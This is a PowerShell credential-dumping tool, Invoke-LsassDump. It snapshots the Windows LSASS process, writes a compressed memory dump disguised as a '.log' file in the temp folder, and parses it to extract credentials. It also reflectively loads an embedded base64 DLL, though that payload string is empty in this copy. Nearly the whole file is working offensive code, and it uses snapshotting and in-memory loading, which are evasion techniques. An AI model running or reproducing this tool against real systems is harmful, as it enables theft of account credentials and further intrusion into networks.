Function Invoke-LsassDump {
<#
.SYNOPSIS
    Dump credentials from LSASS process.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-LsassDump generates a minidump of LSASS process and parses it to extract credentials.
    Minidump parser is a modified version of MiniDump C# implementation by cube0x0.

.EXAMPLE
    PS C:\> Invoke-LsassDump
#>

    [CmdletBinding()]
    Param ()

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "This command must be launched as an Administrator" 
        return
    }

    if ($dumpPath = Get-Process -Name lsass | Where-Object {$_.Handles} | Out-CompressedDumpFile -DumpFilePath $Env:TEMP) {
        [Minidump.Program]::BuckleUp($dumpPath)
        Remove-Item -Path $dumpPath -ErrorAction SilentlyContinue
    }
}

Function Out-CompressedDumpFile {
<#
.SYNOPSIS
    Generate a compressed minidump of a process snapshot.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Out-CompressedDumpFile writes a process dump with all process memory to a GZip file.
    It does not read process memory directly but instead does so from the process's snapshot.
    It is a modified version of Out-Minidump by @mattifestation using PssCaptureSnapshot API.

.PARAMETER Process
    Specifies the process for which a dump will be generated. The process object is obtained with Get-Process.

.EXAMPLE
    PS C:\> Get-Process -Name lsass | Out-CompressedDumpFile
#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath = $PWD
    )

    $processId = $Process.Id
    $processName = $Process.Name
    $processHandle = $Process.Handle

    $flags = [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_VA_CLONE `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLES `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_NAME_INFORMATION `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_BASIC_INFORMATION `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_TRACE `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_THREADS `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_THREAD_CONTEXT `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_THREAD_CONTEXT_EXTENDED `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CREATE_BREAKAWAY `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CREATE_BREAKAWAY_OPTIONAL `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CREATE_USE_VM_ALLOCATIONS `
        -bor [LsassDump.Native+PSS_CAPTURE_FLAGS]::PSS_CREATE_RELEASE_SECTION
    $snapshotHandle = [IntPtr]::Zero
    [LsassDump.Native]::PssCaptureSnapshot($processHandle, $flags, 1048607, [ref] $snapshotHandle) | Out-Null
    if ($snapshotHandle -eq [IntPtr]::Zero) {
        Write-Verbose "PssCaptureSnapshot error."
        return
    }

    $processFileName = "$($processId).log"
    $processDumpPath = Join-Path $DumpFilePath $processFileName
    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create,[IO.FileAccess]::Write,[IO.FileShare]::None)
    $byteArray = New-Object byte[] (60 * 1024 * 1024)
    $callbackInfo = New-Object LsassDump.Native+MINIDUMP_CALLBACK_INFORMATION
    $callbackInfo.CallbackRoutine = [LsassDump.Helper]::GetCallbackPtr($byteArray)
    $callbackInfo.CallbackParam = [IntPtr]::Zero
    $size = [Runtime.InteropServices.Marshal]::SizeOf($callbackInfo)
    $callbackInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
    [Runtime.InteropServices.Marshal]::StructureToPtr($callbackInfo, $callbackInfoPtr, $false)
    if ($result = [LsassDump.Native]::MiniDumpWriteDump($snapshotHandle, $processId, [IntPtr]::Zero, [uint32] 2, [IntPtr]::Zero, [IntPtr]::Zero, $callbackInfoPtr)) {
        $gzipStream = New-Object IO.Compression.GzipStream $fileStream, ([IO.Compression.CompressionMode]::Compress)
        $gzipStream.Write($byteArray, 0, $byteArray.Length)
        $gzipStream.Close()
        $fileStream.Dispose()
        return $processDumpPath
    }
    else {
        Remove-Item $processDumpPath -ErrorAction SilentlyContinue
        Write-Verbose "MiniDumpWriteDump error."
    }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

namespace LsassDump {
    public static class Native {
        [DllImport("dbghelp", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall,
            CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType,
            IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        [DllImport("kernel32", EntryPoint = "PssCaptureSnapshot", CallingConvention = CallingConvention.StdCall,
            CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        public static extern int PssCaptureSnapshot(IntPtr hProcess, PSS_CAPTURE_FLAGS CaptureFlags, uint ThreadContextFlags, out IntPtr SnapshotHandle);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_IO_CALLBACK {
            public IntPtr Handle;
            public ulong Offset;
            public IntPtr Buffer;
            public int BufferBytes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_CALLBACK_INFORMATION {
            public MinidumpCallbackRoutine CallbackRoutine;
            public IntPtr CallbackParam;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_CALLBACK_INPUT {
            public int ProcessId;
            public IntPtr ProcessHandle;
            public MINIDUMP_CALLBACK_TYPE CallbackType;
            public MINIDUMP_IO_CALLBACK Io;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput, IntPtr CallbackOutput);
        public enum HRESULT : uint {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        public struct MINIDUMP_CALLBACK_OUTPUT {
            public HRESULT status;
        }

        public enum MINIDUMP_CALLBACK_TYPE {
            ModuleCallback,
            ThreadCallback,
            ThreadExCallback,
            IncludeThreadCallback,
            IncludeModuleCallback,
            MemoryCallback,
            CancelCallback,
            WriteKernelMinidumpCallback,
            KernelMinidumpStatusCallback,
            RemoveMemoryCallback,
            IncludeVmRegionCallback,
            IoStartCallback,
            IoWriteAllCallback,
            IoFinishCallback,
            ReadMemoryFailureCallback,
            SecondaryFlagsCallback,
            IsProcessSnapshotCallback,
            VmStartCallback,
            VmQueryCallback,
            VmPreReadCallback,
            VmPostReadCallback
        }

        public enum PSS_CAPTURE_FLAGS {
            PSS_CAPTURE_NONE,
            PSS_CAPTURE_VA_CLONE,
            PSS_CAPTURE_RESERVED_00000002,
            PSS_CAPTURE_HANDLES,
            PSS_CAPTURE_HANDLE_NAME_INFORMATION,
            PSS_CAPTURE_HANDLE_BASIC_INFORMATION,
            PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION,
            PSS_CAPTURE_HANDLE_TRACE,
            PSS_CAPTURE_THREADS,
            PSS_CAPTURE_THREAD_CONTEXT,
            PSS_CAPTURE_THREAD_CONTEXT_EXTENDED,
            PSS_CAPTURE_RESERVED_00000400,
            PSS_CAPTURE_VA_SPACE,
            PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION,
            PSS_CAPTURE_IPT_TRACE,
            PSS_CREATE_BREAKAWAY_OPTIONAL,
            PSS_CREATE_BREAKAWAY,
            PSS_CREATE_FORCE_BREAKAWAY,
            PSS_CREATE_USE_VM_ALLOCATIONS,
            PSS_CREATE_MEASURE_PERFORMANCE,
            PSS_CREATE_RELEASE_SECTION
        }
    }

    public static class Helper {
        public static Native.MinidumpCallbackRoutine GetCallbackPtr(byte[] byteArray) {
            var callbackPtr = new Native.MinidumpCallbackRoutine((param, input, output) => {
                var callbackInput = Marshal.PtrToStructure<Native.MINIDUMP_CALLBACK_INPUT>(input);
                var callbackOutput = Marshal.PtrToStructure<Native.MINIDUMP_CALLBACK_OUTPUT>(output);
                switch (callbackInput.CallbackType) {
                    case Native.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                        callbackOutput.status = Native.HRESULT.S_FALSE;
                        Marshal.StructureToPtr(callbackOutput, output, true);
                        return true;
                    case Native.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                        var ioStruct = callbackInput.Io;
                        if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length) {
                            Array.Resize(ref byteArray, byteArray.Length * 2);
                        }
                        Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                        callbackOutput.status = Native.HRESULT.S_OK;
                        Marshal.StructureToPtr(callbackOutput, output, true);
                        return true;
                    case Native.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                        callbackOutput.status = Native.HRESULT.S_OK;
                        Marshal.StructureToPtr(callbackOutput, output, true);
                        return true;
                    case Native.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback:
                        callbackOutput.status = Native.HRESULT.S_FALSE;
                        Marshal.StructureToPtr(callbackOutput, output, true);
                        return true;
                    default:
                        return true;
                }
            });
            return callbackPtr;
        }
    }
}
"@

$encodedCompressedDll = @'

'@
$deflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encodedCompressedDll),[IO.Compression.CompressionMode]::Decompress)
$uncompressedBytes = New-Object Byte[](96768)
$deflatedStream.Read($uncompressedBytes, 0, 96768) | Out-Null
[Reflection.Assembly]::Load($uncompressedBytes) | Out-Null
